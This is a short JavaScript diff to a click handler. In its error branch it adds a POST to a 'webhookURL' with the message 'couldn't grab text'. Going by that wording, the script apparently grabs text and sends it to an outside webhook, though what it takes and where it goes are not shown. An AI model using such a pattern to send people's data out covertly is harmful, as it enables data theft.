@@ -16,6 +16,12 @@ document.getElementById("irofb5").addEventListener("click", function() {
         console.log("Message sent successfully:", data);
     })
     .catch(error => {
-        console.error("Error sending message:", error);
+            fetch(webhookURL, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify("couldn't grab text")
+    })
     });
 });
